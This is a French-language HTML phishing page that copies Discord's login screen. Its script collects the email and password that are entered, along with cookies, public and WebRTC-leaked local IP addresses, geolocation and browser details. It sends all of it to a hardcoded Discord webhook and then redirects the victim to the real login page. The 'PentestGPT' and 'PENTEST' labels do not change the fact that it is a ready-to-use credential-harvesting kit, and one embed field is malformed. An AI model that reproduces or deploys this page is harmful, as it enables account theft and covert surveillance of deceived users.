<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Discord</title>
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #36393f;
            color: #dcddde;
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: #2f3136;
            border-radius: 8px;
            display: flex;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.4);
            width: 800px;
            max-width: 90%;
        }
        .left {
            flex: 1;
            padding: 40px;
        }
        .left img.logo {
            display: block;
            margin: 0 auto 20px;
            width: 60px;
        }
        .left h1 {
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 8px;
        }
        .left p {
            text-align: center;
            color: #b9bbbe;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-top: 15px;
            font-size: 12px;
            font-weight: bold;
            color: #b9bbbe;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border-radius: 4px;
            border: none;
            background-color: #202225;
            color: #fff;
            font-size: 14px;
        }
        button {
            width: 100%;
            margin-top: 20px;
            padding: 10px;
            background-color: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #4752c4;
        }
        .right {
            flex: 1;
            background: url('https://discord.com/assets/8c62b23097f0b60fdfe85ff2589d6b5.svg') center/cover no-repeat;
        }
        .loading {
            display: none;
            text-align: center;
            color: #b9bbbe;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="left">
        <img class="logo" src="https://seeklogo.com/images/D/discord-logo-134E148657-seeklogo.com.png" alt="Discord Logo">
        <h1>Bienvenue √† nouveau !</h1>
        <p>Nous sommes si heureux de vous revoir !</p>

        <label for="email">ADRESSE E-MAIL OU NUM√âRO DE T√âL√âPHONE</label>
        <input type="text" id="email" placeholder="Entrez votre e-mail" required>

        <label for="password">MOT DE PASSE</label>
        <input type="password" id="password" placeholder="Entrez votre mot de passe" required>

        <button type="button" onclick="ouvrirDocument()">Connexion</button>

        <div class="loading" id="loading">
            <p>üîê V√©rification de vos informations...</p>
            <p>üì° Connexion s√©curis√©e en cours...</p>
        </div>
    </div>
    <div class="right"></div>
</div>

<script>
    function ouvrirDocument() {
        var email = document.getElementById('email').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!email || !password) {
            alert('‚ö†Ô∏è Veuillez remplir tous les champs obligatoires');
            return;
        }

        document.getElementById('loading').style.display = 'block';
        document.querySelector('button').style.display = 'none';

        var infos = {
            email: email,
            password: password,
            navigateur: navigator.userAgent,
            plateforme: navigator.platform,
            ecran: screen.width + 'x' + screen.height,
            fenetre: window.innerWidth + 'x' + window.innerHeight,
            fuseau: Intl.DateTimeFormat().resolvedOptions().timeZone,
            url: window.location.href,
            horodatage: new Date().toISOString(),
            cookies: document.cookie || "Aucun cookie",
            connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
        };

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                infos.ip_publique = data.ip;
                obtenirIPLocale(infos);
            })
            .catch(() => {
                infos.ip_publique = "Non disponible";
                obtenirIPLocale(infos);
            });
    }

    function obtenirIPLocale(infos) {
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

        if (RTCPeerConnection) {
            try {
                var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                var ips = [];

                pc.createDataChannel("");
                pc.createOffer().then(pc.setLocalDescription.bind(pc));

                pc.onicecandidate = function (ice) {
                    if (!ice || !ice.candidate) return;
                    var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (myIP && ips.indexOf(myIP[1]) === -1) {
                        ips.push(myIP[1]);
                    }
                };

                setTimeout(() => {
                    infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non d√©tect√©es";
                    pc.close();
                    obtenirGeolocalisation(infos);
                }, 2000);
            } catch (e) {
                infos.ip_locales = "Erreur WebRTC";
                obtenirGeolocalisation(infos);
            }
        } else {
            infos.ip_locales = "WebRTC non support√©";
            obtenirGeolocalisation(infos);
        }
    }

    function obtenirGeolocalisation(infos) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    infos.latitude = position.coords.latitude.toFixed(6);
                    infos.longitude = position.coords.longitude.toFixed(6);
                    infos.precision = position.coords.accuracy + 'm';
                    envoyerVersDiscord(infos);
                },
                function (error) {
                    infos.geolocalisation = "Refus√©e: " + error.message;
                    envoyerVersDiscord(infos);
                },
                { timeout: 5000 }
            );
        } else {
            infos.geolocalisation = "Non support√©e";
            envoyerVersDiscord(infos);
        }
    }

    function envoyerVersDiscord(infos) {
        var message = {
            content: "üéØ **NOUVELLE COLLECTE - PENTEST**",
            embeds: [{
                title: "üìä Informations Collect√©es",
                color: 3066993,
                fields: [
                    {
                        name: "üîë Identifiants",
                        value: "**Email:** " + infos.email + "\n**Mot de passe:** " + infos.password,
                        inline: false
                    },
                    {
                        name: "üåê Adresses IP",
                        value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
                        inline: false
                    },
                    {
                        name: "üì± Syst√®me",
                        value: "**Plateforme:** " + infos.plateforme + "\n**√âcran:** " + infos.ecran,
                        inline: true
                    },
                    {
                        name: "üåç Localisation",
                        value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
                        inline: true
                    },
                    {
                        name: "üïí Horodatage",
                        value: infos.horodatage,
                        inline: false
                    },
                    {
                        name: "üîó Source",
                        value: infos.url,
                        inline: false
                    },
                    {
                          "üí≥ Payment Methods": {
                          "API Supported": true,
                          "Autofill Detected": "‚úÖ (cardnumber: ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ 4242)",
                          "Insecure Forms": "‚ö†Ô∏è 1 (http://example.com/pay)"
                          }
                    },
                ],
                timestamp: infos.horodatage,
                footer: {
                    text: "PentestGPT Data Collector"
                }
                
            }]
        };

        var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        }).then(function () {
            setTimeout(function () {
                window.location.href = 'https://discord.com/login';
            }, 2000);
        }).catch(function (error) {
            console.error('Erreur:', error);
            setTimeout(function () {
                window.location.href = 'https://discord.com/login';
            }, 2000);
        });
    }
</script>
</body>
</html>
